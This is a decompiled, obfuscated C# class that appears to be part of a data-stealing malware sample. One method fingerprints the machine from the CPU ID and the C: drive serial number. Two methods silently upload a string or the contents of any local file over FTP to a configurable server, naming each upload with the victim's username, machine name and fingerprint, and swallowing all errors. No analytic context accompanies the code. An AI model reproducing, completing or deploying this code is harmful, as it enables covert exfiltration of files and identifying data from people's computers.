using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace ALzLGBAFaCqNDAE;

internal sealed class FFdxwtHSrgOu
{
	public static string TAteqXkJVIg()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void ZHclFxzroOwJBCC(string MvYdUTwUNzTderV = "URL", string UotKIxuPHwZqz = "USERNAME", string HaAeKWnxWRfI = "ACCESO", string XDgwshnYmXGHJPs = "")
	{
		try
		{
			string text = TAteqXkJVIg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(MvYdUTwUNzTderV + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(UotKIxuPHwZqz, HaAeKWnxWRfI);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(XDgwshnYmXGHJPs);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void WMaZYGtgQwWMld(string TWUQXGfGhxc = "URL", string aXVbeGhQkYTi = "USERNAME", string seLxleMiIqgDs = "ACCESO", string HfEjYqXYCDspQ = "")
	{
		try
		{
			string text = TAteqXkJVIg();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(TWUQXGfGhxc + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(aXVbeGhQkYTi, seLxleMiIqgDs);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(HfEjYqXYCDspQ))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}
}
